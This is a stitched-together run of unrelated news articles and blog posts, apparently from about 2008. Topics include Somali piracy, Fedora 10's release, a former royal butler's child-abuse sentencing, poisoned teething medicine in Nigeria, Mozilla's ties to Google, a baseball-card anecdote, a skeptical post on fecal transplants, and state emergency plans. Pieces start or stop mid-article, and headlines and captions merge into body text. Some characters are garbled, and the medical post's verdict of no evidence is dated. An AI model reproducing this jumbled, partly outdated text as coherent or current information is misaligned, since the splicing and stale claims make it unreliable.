As for the diplomatic effort on land , that is going even more slowly .
Somalia is basically split into three .
The capital , Mogadishu , is nominally under the control of a transitional government set up after an Ethiopian - led intervention that removed the Union of Islamic Courts .
Between the lack of decisive naval operations and the chaos on land , the pirates have thrived
Somali pirates living the high life Since then , a breakaway Islamist group known as al - Shabab has gained control of much of the south and centre of the country .
An African Union peacekeeping force has been ineffective .
There have been some calls for a larger UN force .
Large parts of population survive on food aid .
The pirates , however , are based further north , in Puntland , a semi-autonomous region , where the port of Eyl is the main pirate base .
There is a president but he has either no power or no interest in stopping a lucrative form of income .
It is believed that the money gained from ransom is more than the income of the local government of Puntland .
Further round the coast again is Somaliland , which would like international recognition of its independence .
The chances of there being a united , peaceful Somalia in the foreseeable future are close to nil .
Between the lack of decisive naval operations and the chaos on land , the pirates have thrived .

Despite a security breach earlier this year , Red Hat is out today with its tenth release of the Fedora Linux distribution , promising new open source security , virtualization and appliance - building technologies .
The release of Fedora 10 , codenamed Cambridge , had been delayed following the security breach in the Red Hat Fedora infrastructure .
The launch also comes as Fedora is in the spotlight after Red Hat claimed that the distro has over 9.5 million machines running its software -- a figure that it would make it the most widely installed Linux distribution .
Fedora insiders said the delay caused by the security breach did n't dramatically upset the distribution 's launch timing .
" If you look at our original schedule we were supposed to release around Oct. 28 and here we are , four weeks later than what we expected , " Paul Frields , Fedora 's project leader , told InternetNews.com .
The outage itself lasted about three weeks , he added , " and during that time , our infrastructure team nuked our infrastructure and rebuilt the entire thing . "
Frields explained that during the outage , the Fedora project ceased producing its RAWHIDE daily builds , which help to push development of the mainline release -- ultimately impacting the release date .
On the other hand , Frields argued that the infrastructure shutdown enabled Fedora to make some improvements to its backend infrastructure that otherwise might not have been possible .
" We reconstructed everything from scratch and after those three weeks , we really only lost a week on top of that compared to our original schedule , " Frields said .
" So we look at it as a fairly successful release overall , given the circumstances that we had to work with . "
Fedora has not yet issued full details on the root cause of its breach , and whether or not it involved malicious hacker activity .
Frields said Fedora plans on issuing a final report on the issue in the future , once it 's fully detailed the problem .
He added that producing a complete and accurate report is a priority for both himself and for the Fedora community .
Improvements in Fedora 10
While security for Fedora 's own internal infrastructure is a key concern of the team , security also was a key theme in the Fedora 10 release as well .
A new security audit tool , called secTool , enables users to see if a system configuration has any security flaws .
SecTool is also a framework that can be leveraged by users to build their own security tests .
Fedora 10 also helps to expand appliance options with its Appliance Tools technology , a feature that 's intended to make it easier for developers and independent software vendors to build Fedora - based appliances .
Appliance Tools include the ACT ( Appliance Creation Tool ) and the AOS ( The Appliance Operating System ) , which is a stripped down version of Fedora .
The hope is that developers could use the tools to build virtual software appliance , LiveCD based appliances or even bare - metal hardware appliances .
As part of the appliance effort , Fedora also is launching a new branding effort , with a Fedora Remix logo that can be used by developers to identify their Fedora - based appliances -- similar to Intel 's " Intel Inside " logo program .
Frields noted that Fedora 's inclusion of Appliance Tools is part of a larger open source effort to develop Linux - based appliances , which Red Hat is sponsoring with its new Thincrust .
net project .
Beyond appliances , virtualization also gets a boost in Fedora 10 with the new VirtRemoteInstall tool .
Frields explained that the tool extends the capabilities of virtualization on Fedora , making it easier for admins to create virtual machines on remote hosts .
VirtRemoteInstall is an extension of the Fedora - developed libvirt technology , which is an open source wrapper for managing virtualization .
Libvirt is used by other Linux distributions , including Ubuntu , as a key part of its virtualization feature set .
" Libvirt abstracts away the underlying hypervisor technology , so that you can use the same tools to manage your virtual machines -- whether they are based on Xen or KVM , " Frields said .
Overall , Frields is very confident in the features that Fedora 10 is offering .
It 's a confidence that is based on past experience with features like libvirt .
" I feel that we have an incredibly healthy community and we know we are providing great features because they end up in every other distribution , " Frields said .
" We 're happy that things work that way -- it 's the open source way .
If another distro uses a Fedora - developed feature , it puts it in front of more users , and then we can improve it faster . "
Abuser traded on royal connection A former royal butler to the Queen and Queen Mother has been jailed for child abuse offences .
Paul Kidd , 55 , of Stalybridge , Greater Manchester , pleaded guilty to charges including indecent assault and sexual activity with a child .
He was given an indeterminate prison term for the public 's protection and ordered to serve at least six years .
Manchester Minshull Street Crown Court heard Kidd even took one of his victims to tea with the Queen Mother .
Kidd , of Castlehall View , worked as a butler from 1977 to 1979 and was senior footman to the Queen Mother from 1979 to 1984 .
The offences were committed between 1974 and 1977 , 1981 and 1983 - when he was in the employ of the Queen Mother - and 2005 to 2008 .
Kidd faced nearly 30 charges relating to sexual abuse against three children , who were under 16 when the offences took place .
Please turn on JavaScript .
Media requires JavaScript to play .
The charges included nine offences of indecent assault on a boy under 16 , three counts of sexual activity with a boy under 16 and three counts of sexual activity with a boy under 16 .
Kidd also admitted 11 counts of making indecent photographs of a child and two charges of possessing indecent photographs of children .
Judge Mushtaq Khokhar told Kidd : " You were someone who had influenced your victims to such an extent they were under your spell .
" They would do anything you asked them to do .
I regard you as someone who is dangerous and presents a risk to all the young people you may come across . "
The court heard Kidd started grooming one of the boys when the victim was 12 after he had met him as a patient on a hospital ward where Kidd worked as a trainee nurse .
Another victim was 14 years old when he first spoke to Kidd on the CB radio airwave , the court heard .
The levels of abuse Kidd and Hobday subjected their victims to is nothing short of monstrous
Det Con James Teggart Kidd was caught after one of his three abuse victims read a newspaper interview which he gave on the 10th anniversary of the death of Diana , Princess of Wales .
Evidence of further abuse was uncovered during a search of Kidd 's home .
Among items found on his computer were 18,019 images of unknown children and a video recording of him abusing another youngster as recently as 2006 .
Kidd introduced his most recent victim to a friend , David Hobday , who also abused the child .
Hobday , 57 , of St John Street , Dukinfield , was jailed for three years after he pleaded guilty to six counts of sexual activity with a child and one count of possessing an indecent image of a child .
Kidd introduced friend Hobday to one of his victims Summing up his sentence , Judge Khokhar said to Kidd : " Each case involved grooming followed up by sexual abuse .
" In each case you gained the trust of the parents of the young victims so they could spend more time with you without expecting anything untoward was taking place . "
He said he agreed with a pre-sentence report which found Kidd was " dangerous " because of his continued protestations he had done no damage to his three victims .
" There is a significant risk of you posing serious harm by the committing of sexual offences of this kind , " Judge Khokhar added .
Speaking outside court , Det Con James Teggart of Greater Manchester Police 's Child Protection
Unit said : " The levels of abuse Kidd and Hobday subjected their victims to is nothing short of monstrous .
" The pair are sexual predators who have manipulated their victims and subjected them to the most horrific abuse time and again .
" The victims have had their childhoods taken away from them and will have to deal with what they 've been put through for the rest of their lives . "

LAGOS , Nigeria ( CNN ) -- Nneka and Chimezie Ononaku unwittingly poisoned their own four - month - old son Chinonso .
A television image of Chinonso Ononaku , who died after being given the medicine " My Pikin . "
Giving him what they thought was a baby teething medicine , they were in fact dosing him with anti-freeze .
The bottle had been contaminated with a toxic chemical called diethylene glycol .
More than 30 Nigerian children are thought to have died recently after taking the medicine .
Nneka is angry .
" It 's not easy carrying a pregnancy for nine months , [ and ] after that getting a drug from a pharmacy to kill your own child , " she says .
When Nigeria 's Agency for Food and Drug Administration and Control ( NAFDAC ) tested the medicine , " My Pikin , " the results were terrifying .
It found the medicine contained almost 90 ml of diethylene glycol per 100ml .
" It 's a bottle of poison , " the NAFDAC laboratory said .
The " My Pikin " factory 's managing director and eight others have been charged with negligence .
The company could not be reached for comment .
Nigeria is on the frontline in the global fight against counterfeit drugs .
Undercover NAFDAC officers have taken to the streets in order to combat unregistered and often harmful drugs .
Hawkers are charged with selling counterfeit drugs and forced to pay a fine .
Watch more on the poisonings »
NAFDAC claims most of the counterfeit drugs come from India and China .
And it 's big business -- America 's Centre for Medicines in the Public Interest predicts counterfeit drug sales will reach $ 75 billion in 2010 .
NAFDAC 's director - general Dora Akunyili warns counterfeiting is not just a Nigerian problem .
" These criminals are cooperating , so we too need to cooperate if we can face them .
Not only in Nigeria but internationally , because drug counterfeiting involves a trans-national criminal network and can only be dismantled through international co-operation . "
People were discussing pidgin languages in comments on the last post , and this reminded me of one of the most remarkable novels of the last 30 years , Russell Hoban 's Riddley Walker .
It is set in a post - apocalyptic future in which language along with civilisation has been broken down to shards and fragments .
I had to read it about three times before I could read the new language easily – I nearly wrote " comfortably " but it's an impossible book to read comfortably .
The action takes place in what was once Kent .
The pillars of Canterbury
Cathedral still stand ( " a forest made of stone " ) but nothing remains of
religion or literacy except a vague shamanism and a cult organised
around Punch and Judy shows which culminates in the ritual murder of a
sacrificial victim :
' sharna pax and hed on a poal when the ardship of Cambry come out of his hoal '
In English :
' Sharpen axe and head on a pole , when the Archbishop of Canterbury comes out of his hole '
There are times when I wonder why the book is treated as science fiction .
What makes the book so memorable is the sense of what it is like to live in a polytheistic world , full of conflicting and often implacable powers .
It is a portrait of a world which was destroyed by science and is now trying to reconstruct itself on the basis of superstition .
The nature of the great catastrophe is unclear , as it would be in any succeeding age of barbarism ; but the characters remember the legend that it involved :
the littl shynin man , the Addom he runs in the wud .
In the rough rubble of " Addom " and " wud " are buried both " Adam " and " Atom " ; both " wood " and " would " .
The little shining man is both the atom and the soul , " the realest part of you " as the archbishop says when he is haltered and waiting for his death .
You could n't do that in ordinary language without looking arty , which Riddley Walker emphatically is not .
I do n't know anything that catches the sense of fear in front of unknown powers as well as this passage , from early on , when Riddley Walker is with the village shaman :
Looking at the moon all col and wite and oansome .
Lorna said to me , ' You know Riddley theres something in us it do n't have no name . '
I said , ' what thing is that ? '
She said , ' Its some kynd of thing it aint us yet its in us .
Its looking out thru our eye hoals …
Its all 1 girt thing bigger nor the worl and lorn and loan and oansome , Tremmering it is and feart .
It puts us on like we put on our cloes .
Some times we dont fit .
Some times it cant fynd the arm hoals and it tears us a part .
I dont think I took all that much noatis of it when I ben yung .
Now Im old I noatis it mor .
It do n't realy like to put me on no mor .
Every morning I can feal how its tiret of me and readying to throw me a way .
Iwl tel you some thing Riddley and keap this in memberment .
Whatever it is we dont come naturel to it . '
I said , ' Lorna I dont know what you mean . '
She said , ' We aint a naturel part of it , We dint begin when it begun we dint begin where it begun .
It ben here befor us nor I do n't know what we are to it .
May be weare jus only sickness and a feaver to it or boyls on the arse of it I do n't know . '
If you were to deify the DNA that Richard Dawkins writes about , and give it still more character traits than selfishness and indifference , that is how it would appear , as a thing which puts us on like we put on our clothes .

Have you ever felt teased when driver developers of other operating systems teased you about a lack of a " proper " driver development kit for Linux ?
Have you felt left out of the crowd when looking at the 36 cdrom package of documentation and example source code that other operating systems provide for their developers ?
Well feel ashamed no longer !
In coordination with the FreedomHEC conference this week in Seattle , WA , USA , I 'm proud to announce the first release of the Linux Device Driver Kit .
It is a cd image that contains everything that a Linux device driver author would need in order to create Linux drivers , including a full copy of the O'Reilly book , " Linux Device Drivers , third edition " and pre-built copies of all of the in - kernel docbook documentation for easy browsing .
It even has a copy of the Linux source code that you can directly build external kernel modules against .
It can be downloaded for free here .
and all attendees of FreedomHEC will get a physical copy , for you to leave around your desk for other developers to envy .
There 's a few things that I would like to include in future versions of this cdrom :
searchable index of all documentation .
jsFind looks like will work for this , but due to time constraints , did not make this release .
prettier web pages .
I acknolodge I 'm no designer , anyone who wants to fix up my sparse html with proper CSS support and images would be greatly appreciated .
More documentation .
Possible inclusion is a snapshot of the kernelnewbies wiki .
As we have plenty of room , any pointers to stuff that should be included is welcome .
And of course , the image is released under the GPL v2 and can be copied freely .
There 's a cdrom label included in the root directory if you wish to print it out .

Mozilla 's relationship with Google , its main source of income , has become complicated since the release of Chrome as an alternative to Firefox , Mozilla 's head honcho has admitted .
John Lilly , Mozilla 's chief exec , described the relationship with Google as cordial but " complicated " since the release of Chrome in September .
" We have a fine and reasonable relationship .
But I 'd be lying if I said that things were n't more complicated than they used to be , " Lilly said last week , Computerworld reports .
Around 88 per cent ( $ 60 m ) of Mozilla 's revenues for 2007 comes from Google , so it 's no surprise that the role of Google as main paymaster and significant competitor , since the release of Chrome , is creating a certain awkwardness .
Google released the first full version of Chrome earlier this month .
More significantly , from Mozilla 's perspective , it replaced Firefox with Chrome as the default browser software in its Google Pack application bundle .
Lilly defended the relationship with Google by pointing out that vendors in many areas of IT compete on some fronts while co-operating in others .
" Companies cooperate in certain areas and compete in other areas all the time .
We 're cooperating with Google because we believe that search is a fundamental entry point to the web , and right now Google gives the best search experience . "
Lilly hinted at plans by Mozilla to partner with country - specific search developers and to gain more revenue from mobile browsing , where rival Opera enjoys a successful presence .
Mozilla is working on plans to develop a browser capable of running on smartphones running either Windows Mobile or Linux , with the release of the final version of the software ( currently in Alpha ) due next year .
Need for speed
The development teams of both Chrome and Firefox are working on improved JavaScript engines .
Dean Hachamovitch , general manager of Microsoft 's Internet Explorer division , recently criticised the increased focus on speed of performance that has accompanied increased competition in the browser market as a " drag race " .
Lilly criticised Hachamovitch's take that these developments might be of questionable relevant to mainstream internet users .
" It 's a pretty good time to be a browser user .
There are more smart people hacking on browsers than in a long time .
But when I hear Dean [ Hachamovitch ] say JavaScript performance is for crazy guys to worry about , then that worries me , " he said
According to statistics from Net Applications , Firefox counts for 21 per cent of the browser market , with IE still some way ahead on 70 per cent and Chrome somewhat under performing with just 0.8 per cent .
Lilly expressed confidence that Mozilla can maintain its momentum . ®
Bettie Page , the brunet pinup queen with a shoulder - length pageboy hairdo and kitschy bangs whose saucy photos helped usher in the sexual revolution of the 1960s , has died .
She was 85 .
Page , whose later life was marked by depression , violent mood swings and several years in a state mental institution , died at a Los Angeles hospital where she had been on life support since she had a heart attack on Dec. 2 , according to her agent , Mark Roesler .
A cult - culture figure , Page was most famous for the estimated 20,000 4 - by - 5 - inch black - and - white glossy photographs taken by amateur shutterbugs from 1949 to 1957 .
“ Exactly what captures the imagination of people in terms of popular culture is something hard to define , ” Playboy magazine founder Hugh Hefner once said of Page .
“ But in Bettie ’s case , I ’d say it ’s a combination of wholesome innocence and fetish - oriented poses that is at once retro and very modern . ”

Ok , Obama election back - patting time over .
The stock market forces us to get back to the crappy economy .
After yesterday 's rally , each of the major markets are down over 5 % , with losses particularly heavy on the NASDAQ .
Obama 's detractors will say " see , here 's what you get for electing a socialist , " but it 's not like yesterday 's outcome was much in doubt .
Obama supporters have yet to prove that the econom will reap a good vibes dividend .
Got any theories beyond an imbalance of selling and buying pressure ?
Have at it in the comments .
As expected , the media in Dallas -- and nationwide -- has been none - too - kind to the Dallas Cowboys since the team 's 44 - 6 loss to Philadelphia that left the Cowboys out of the NFL playoffs .
" Another Cowboys season goes by the wayside , " headlined the Fort Worth Star - Telegram .
The Clarence E. Hill Jr. column led with " Pathetic .
Truly pathetic . "
" Quittin ' Time " blared The Dallas Morning News .
A column by Jean - Jacques Taylor led with : " Wade Phillips presides over the most gutless team in franchise history .
That 's his legacy .
Forever . "
The Cowboys ended the season with back - to - back losses to Baltimore and Philadelphia .
Their 9 - 7 record was n't good enough for an NFC playoff berth .
The Cowboys have n't won a playoff game since Dec. 28 , 1996 , when they beat Minnesota .

With just a little over two weeks to go until the New Year , technology strategists and pundits are revving their prognostication engines to predict what 2009 will usher in .
But unlike the last handful of years or so , the economic environment is dreadful , with thousands of high - tech layoffs by parched startups seeking exit strategies after coming up dry at the venture capital wells all over the country .
Bellwethers may suffer layoffs , but they will largely remain intact should the recession deepen .
IBM is one of the vendors that sees the harsh economic climate as a catalyst for opportunity , particularly for Web 2.0 software in the workplace .
Doug Heintzman , director of strategy for IBM's Lotus collaboration software unit , discussed technologies and trends that will change the way we work in 2009 .
The answers comprise the usual mixed bag we 've come to expect from IBM .
UCC ( unified communications and collaboration ) is getting stronger , supported by SAAS ( software as a service ) , cloud computing , mashups , Web browser technologies , free software and , of course , Linux and open source .
Expect to hear more about all of these at Lotusphere 2009 next month .
However , Heintzman said IBM has changed its tune with regard to Linux , noting that the emergence of netbooks -- those cheaper , tiny laptops -- have opened a crack in Microsoft 's Windows operating system hegemony .
Indeed , given Microsoft 's Windows control " we 've been pretty cautious about declaring Linux as viable on the desktop , " Heintzman told eWEEK , adding :
We may well be at an inflection that , with distributions like the Ubuntu distribution , with the rise of popularity in the Mac OS platform , maybe the market starts to fragment and the monopoly loses its power .
The Vista launch did n't help matters much .
Netbooks , where people are using a basic set of capabilities on the desktop but are storing photos and music files and editing their documents in much more in an online way ....
All these factors combined suggest that this may be an important inflection for this new class of ultralight laptop computers , the Asus Eee PCs and Everex CloudBooks of the world .
You 're dealing with price points and memory - and processor - size restrictions that make them extremely attractive for a Linux operating system as opposed to a Windows operating system .
Heintzman , who admitted to being won over when one of his colleagues let him play with it , predicted that as more and more people begin to use netbooks for play , more robust netbooks and even desktops based on Linux will rise up as more cost - effective , secure and durable machines .
Noting that Lenovo , Dell and HP are getting into this game , Heintzman said " these whole class of cloud notebook may be the thing that changes the viability of Linux on the desktop . "
As Microsoft Watch 's Joe Wilcox notes on one of his many blog posts regarding threats ( and opportunities ) to Microsoft , manufacturers shipped 6.5 million mini-notebooks during the first three quarters , according to IDC , which predicts full - year shipments of 10.88 million , up from 181,000 last year .
WASHINGTON --
The Supreme Court reaffirmed its June ruling that capital punishment is unconstitutional for crimes short of murder , rejecting pleas from the Bush administration and the state of Louisiana to reconsider in light of new information .
In June , the court ruled , 5 to 4 , that a Louisiana statute providing the death penalty for raping a child under age 12 violated the Eighth Amendment , which bans " cruel and unusual punishments . "
The case dealt with the March 1998 rape by Patrick Kennedy of his 8 - year - old stepdaughter ....
Cellphone radiation is spawning worries that it can do everything from making sperm stupid to popping popcorn ... which means it 's prime time to start selling " cures " like this " radiation reducing " E - wave phone chip .

Omega , a Belgian health products company that usually markets things like suntan lotion and wart treatments , is branching out into protective tech gadgets .
It 's E - wave chip , which attaches onto phones , allegedly offsets electromagnetic radiation and neutralizes the " heating effect " caused by electromagnetic signals .
All tests to prove these claims seem to have been done by Omega itself .

It was the bat that he designated to use only in batting practice .
It was the bat that had " F - - K FACE " written on the knob , the obscenity in its full four - letter glory .
ESPN 's Tim Kurkjian , then working for the Baltimore Sun , got to Ripken and Fleer first .
Fleer 's president Vincent Murray claimed that had n't seen it before and that the company was doing all it could to correct the error immediately .
Ripken told Kurkjian he was angry and disappointed .
" It appears I was targeted ( by teammates ) , " Ripken told Kurkjian .
" I know I 'm kind of a jerk at times .
I know I 'm a little off .
But this is going too far . "
What ensued was absolute chaos and —as the " error " card 's price rose to nearly $ 500 — there were some amazing stories .
A kid , who happened to be a fan of Ripken , had purchased a huge lot of No. 616's from a dealer for $ 50 .
When the curse was found , the new worth of the cards was closer to $ 20,000 .
There was the story of one kid who sued another kid for convincing him to sell his Billy Ripken for $ 1 , without knowing the curse was on the bat .
And the tale of the Geraldo show entitled " Men who write bad things in public places , " when an audience member claimed it was he who wrote the obscenity on Ripken 's bat .
For nearly 20 years , Billy Ripken has n't told the whole story .
That is , until he revealed to me how it all went down :
" I got a dozen bats in front of my locker during the 1988 season .
I pulled the bats out , model R161 , and noticed -- because of the grain patterns -- that they were too heavy .
But I decided I 'd use one of them , at the very least , for my batting practice bat . "
" Now I had to write something on the bat .
At Memorial Stadium , the bat room was not too close to the clubhouse , so I wanted to write something that I could find immediately if I looked up and it was 4:44 and I had to get out there on the field a minute later and not be late .
There were five big grocery carts full of bats in there and if I wrote my number 3 , it could be too confusing .
So I wrote 'F - - k ' Face on it . "
" After the season was over , in early January , I got a call from our PR guy Rick Vaughn .
He said , ' Billy , we have a problem . '
And he told me what was written on the bat and I could n't believe it .
I went to a store and saw the card and it all came back to me .
We were in Fenway Park and I had just taken my first round of BP .
I threw my bat to the third base side and strolled around the bases .
When I was coming back , right before I got up to hit again , I remember a guy tapping me on the shoulder asking if he could take my picture .
Never once did I think about it .
I posed for the shot and he took it .
" I tried to deflect it as much as I could .
It was fairly easy to say that somebody got me with a joke because people think you 're the scum of the earth for doing something like this .
The truth is that there 's a lot of words like that that are thrown around in the clubhouse .
They just do n't get out there . "
" I can't believe the people at Fleer could n't catch that .
I mean , they certainly have to have enough proofreaders to see it .
I think not only did they see it , they enhanced it .
That writing on that bat is way too clear .
I do n't write that neat .
I think they knew that once they saw it , they could use the card to create an awful lot of stir . "
" I have no idea where that bat is today .
If I were to guess , I would say it probably got lost after someone used it in a game .
Probably a guy like Brady Anderson because he choked up so he could use a heavier bat . "
" Fleer sent me some of the cards out of the goodness of their heart .
I autographed them and used them for my gifts to my groomsman in my wedding ( which took place that offseason ) .
I figured , at the time , it was better than giving them a set of cufflinks .
I think I devalued the cards by signing them though . "
" When people recognize me , I see the look on their face .
They think of the card immediately and , before they even ask , I say , ' Yeah , it was me . '
I do n't know if it happens daily , but , to this day , it still happens a couple of times a week . "
There were at least 12 different versions of the card in various states of blackout .
First reports estimated that there were about 3,000 cards featuring the full obscenity , but it is believed that there were actually more than 100,000 of them that hit the market .
A man named Donovan Ryan has maintained a web site called BillRipken.com , a site that talks just about the card and has been visited about 19,000 times .
Today , the Billy Ripken 1989 Fleer obscenity card sells for about $ 5 .
The 1989 Fleer card of his Hall of Fame brother still sells for less .

Many Americans will be introducing more food than usual to their GI tracts on this Thanksgiving Day , and so I thought I ’d provide you with a special gastroenterology - related post to complement the mood .
If you have already eaten , I might suggest that you come back to this post on an empty stomach .
I will be discussing the alternative medicine practice known as “ fecal transplantation ” and it is rather unsavory .
The idea of transferring stool from one person to another ( for the treatment of various GI disorders ) was first described in the 1950s .
This month the TV show , Grey ’s Anatomy , featured the practice in one of their plot lines – which rekindled interest in the therapy , and resulted in an explosion of search engine activity .
I figured it was probably my duty , as a member of Science Based Medicine , to offer a rational analysis of the treatment in the hope that the Google gods will serve up my post to a few of the information - seekers out there .
I hope to reach them before the snake oil salesmen , wrapped in their mantle of “ gentle , natural cures , ” convince them that they desperately need a good colon or liver cleanse , if not a fecal transplant .
Like most alternative therapies , fecal transplantation is based on a drop of truth and a gallon of pseudoscience .
It is true that the gastrointestinal tract is teeming with hundreds of thousands of bacterial species and pseudo - species , and that without them we would die .
It is also true that certain nasty bugs ( like clostridium difficile ) cause problems when they take up residence within the gut .
Antibiotics do upset intestinal flora , much to the consternation of infectious disease specialists .
Now , all that being said – the practice of repopulating the gut with another person ’s stool requires some fairly grand assumptions about efficacy and safety that are not founded upon any clinical trial data whatsoever .
How It Works
My friend and pro-science advocate , Dr. Brian Fennerty , explained to me that the process of fecal transplantation ( as described in the literature ) requires a few steps .
First , the undigested matter from the donor stool must be removed with some sort of straining device .
Next the remaining fluid is spun in a centrifuge to reduce the material into a bacterial “ pellet . ”
Finally the pellet may be introduced to the patient through a nasogastric tube , or reconstituted in liquid and inserted into the rectum in the form of an enema .
The Underlying Assumptions
In order to recommend fecal transplantation , one would have to make a number of assumptions .
These giant leaps present little cause for hesitation among some alternative medicine practitioners :
• That gut derangements ( such as inflammatory bowel disease ) are caused by imbalances in intestinal flora
• That gut diseases could be improved or treated with introduction of donor stool to the GI tract
• That donor stool will provide the right sort of bacterial colonies to restore the correct “ balance ”
• That bacteria from donor stool will actually colonize the new gut , rather than exit with the next meal
• That a recolonization will endure long enough to affect the underlying disease being treated
• That donor stool will not introduce any unwanted pathogens
• That there are no negative side effects ( sepsis , perforated colon , exacerbation of colitis , etc. ) that outweigh the possible benefits .
The Dangers
The human GI tract is not just full of bacteria , but it can also be populated with viruses , fungi , protozoa and parasites .
Fecal transplants can transmit HIV , prion disease , e. coli 0157:H7 , worms , shigella and other dysentery - causing infectious agents .
Current laboratory testing is unable to detect all possible pathogens , especially prions .
It is therefore impossible to declare a stool sample “ safe ” with our current technology .
The Scientific Literature
To my knowledge , there have been no controlled trials to evaluate the outcomes of fecal transplants .
There are several observational studies suggesting that patients with c. diff colitis and certain inflammatory bowel conditions improve after the introduction of donor feces .
Of course , observational studies do not establish that the treatment is more efficacious than a tincture of time .
A summary of the literature ( with references ) may be found here .
Ironically , the website that features these references claims that fecal transplants may be helpful in the treatment of everything from heartburn , to immune deficiencies , to autism .
Apparently , they did n’t analyze the literature they cite .
Conclusion
There is currently insufficient evidence to recommend fecal transplantation for any patient .
There are clear risks , and no proven benefits .

This is an example of why the controversy over Pharma influence on doctors is , while accurate , likely irrelevant .
In Psychiatric Times , the Time Magazine of psychiatry , there appears a powerful juxtaposition of stories that was likely not appreciated by the editor .
The first story , " Vermont Psychiatrists Unduly Influenced " says what it looks like it would say .
The attorney general finds that Pfizer , Lilly , etc spent $ 3 M on marketing to doctors , a 33 % increase over last year .
The second story is literally in the next column .
" 30 % [ of Americans ]
Have Received [ Psychiatric ] Treatment " especially people in their 20s - 30s .
Furthermore , the article notes there are still significant barriers to treatment -- so more people would have gone if they could .
Doctors are being paid to write these meds ?
Wait -- what , exactly , are they being paid to do ?
Write Zyprexaof Geodon , notGeodon .
And only to the people who show up in their offices .
Right ?
These marketing efforts should result in skewed prescribing , but notprescribing .
In theory , the best Pharma can do is get everyoneon meds .
The problem , bluntly , is n't that Pharma is getting docs to write prescriptions .
The problem is that our beloved country is going completely insane .
The supply of pills is n't the issue , the issue is the demand for them -- for anything , for relief .
At some point , someone needs to stop asking why docs are writing Zyprexa , and ask why people are rushing to psychiatrists .
Did the gene for bipolar suddenly get activated by a viral pandemic ?
Or are there social reasons for this ?
As if to further support my premise , the next article immediately below that one is " Drugs Easy To Get Online , " saying that people are getting pills from online pharmacies without prescriptions .
People want the meds , not even because they work , but simply because they are hope , they are a chance .
These meds are the wrong solution for what are largely social / economic / family problems .
However , not only are there no other solutions ; not only is no one even suggesting that these are social problems ; current policy is to label these social ills as psychiatric .
I get it , it buys you about a generation .
But not much more time than that .
In my opinion , Twitter is the easiest way for people new to social media to get involved .
But What ’s Twitter ?
The New York Times says :
Twitter is a simple messaging service that you ’ve either heard about a lot or not at all .
Either way , itâ€™s a fun and useful tool , well worth trying if you want to reach potential and existing customers , employees or employers .

FAIRFAX , Va. , October 23 , 2008 -- Seven years after Sept. 11 , and in the wake of many major natural disasters such as forest fires , hurricanes and flooding , nearly half of U.S. states either have no state - level emergency plan or do not provide it readily to the public , reveals a new study by George Mason University Communication Professor Carl Botan .
Despite federal laws that require a state emergency operations plan ( EOP ) as a prerequisite to some federal funding , 22 states were unable to provide Botan with an EOP , withheld the plan on security grounds or made it difficult for even trained researchers to gain access .
Residents of these states , Botan says , may question their state 's preparedness because they are unable to find out how the highest authorities in their state coordinate responses to major disasters or how to have a say in those plans .
" While most Americans will have access to some important state - level information during emergencies , many may not .
When minutes may make the difference between life and death in an emergency situation , the population should not have to waste precious time looking for answers or who to turn to , " says Botan .
The study , " Using Sense - Making and Co-orientation to Rank Strategic Public Communication in State Emergency Operations Plans , " graded and ranked the state emergency operations plans of the 50 U.S. states and the District of Columbia on their communication components .
Botan analyzed the accessible state EOPs for three criteria : if the plans had a two - way communication component , if they addressed the communication needs of vulnerable populations and if they treated public communication as important enough to specifically address it in the plan .
He found that the 29 jurisdictions that do have plans available make provisions for public communication -- including news releases and public broadcasts , but only 16 of them make explicit or implicit provisions for two - way public communication such as community forums and focus groups .
Botan feels that two - way public communication is essential in the plans , for that will allow the state to understand what its residents feel they need in emergency situations .
Of the 29 plans obtained , only two -- Washington , D.C. [ which is treated as a state - level entity for this purpose ] and New Mexico - - received a perfect score of eight for communication .
In addition , while 16 states mentioned vulnerable publics , only 13 of these discussed specific communication strategies for these vulnerable publics in their plans .
For example , California mentions specific strategies such as dispatching special teams targeting vulnerable populations like the aged and the disabled , while Arizona simply mentions that emergency managers must pay attention to " special needs " people like residents of nursing homes and the hearing impaired , but does not outline specific strategies to communicate with them .
As of 1988 , all states are required under the Stafford Disaster Relief and Emergency Assistance Act to have a written EOP in order to qualify for some federal funding .
" Billions of tax dollars have been spent on homeland security in the last half - decade , " Botan says .
" It 's very important that these plans are available to the public .
Otherwise residents can't be confident their needs have been thought of , and are n't sure who they can count on . "

The study , co-authored by George Mason University alumni Paul Penchalapadu , is to be presented at the National Communication Association annual conference in San Diego on Saturday , Nov. 22 .

I just finished redoing the template for this here blog thing , and the most significant change is that there are no longer comments on it .
I reached this decision starting from a simple engineering observation : a good piece of software does few things and does them well .
It should n’t re- invent things , and it certainly should n’t re-invent things poorly .
Looking at it like that , it ’s obvious that the core feature of the blog is my text ( whether that feature sucks or not I ’ll leave up to you ) .
The comment engine is peripheral , and , frankly , not very well done .
There ’s no threading , up / down - voting , user information , good formatting , etc .
It ’s pretty lame .
So I figured it would be better to re-use an existing comment system .
Reddit is open source so I could , in theory , use that .
But thinking about it a bit more , the obvious problem is that the best feature of reddit ( and digg ‘s , dzone ’s , etc. ) comment systems is n’t the code , it ’s the people .
So the solution is simple : take comments off my blog and just direct people to comment on one of those sites .
Odds are good that they ’re already a member of one or more of them anyway so there ’s is n’t a lot of hassle there .
Downsides
One of the obvious downsides is that conversation about what I write is no longer on my territory .
I lose the ability to moderate them or decide how long they ’re online .
If reddit kills the thread for one of my posts there ’s nothing I can do about it .
If some guy on digg thinks I ’m an ass , I ’m powerless to silence him .
If I cared about traffic or “ stickiness ” or something it might also bother me that people will no longer come to my site to see further comments .
They ’ll go to reddit , or digg , or wherever .
But I do n’t care about any of those .
Honestly , traffic to my server is a net negative .
Bandwidth costs me money .
What motivates me is writing , and having people read it and discuss it .
Deleting spam comments is not how I get my rocks off .
Upside
From that perspective , offloading comments makes a lot of sense .
My little Wordpress blog ca n’t hope to provide a comment UI anywhere near as good as most news aggregators out there .
Every time I saw someone posting a comment with code on my blog followed by another comment apologizing for the way WordPress ate its formatting , I cringed .
Now I do n’t have that problem : reddit has markdown .
Likewise , I do n’t have to moderate comments anymore .
News aggregators are centered almost precisely on that problem and they do it far better than I can .
More importantly , they provide a better community for discussing my writing than I can .
It ’s a bit odd , but more people will comment about a blog post of mine on another site than they will on the post itself .
The logic is obvious .
You do n’t get reddit karma for commenting on my blog on my blog but you do if you comment on it on reddit .
Since commenting on another site is clearly better , I may as well make it the only choice .
The Real Downside
There is one very real bad part about the change , though .
If you ’ve been kind enough to comment on my blog before , your comment is no longer online .
This is n’t because your comments were n’t good .
The quality of comments I received was always stellar , even when you fought with the limitations of the system .
I ’m sorry your words are no longer up here .
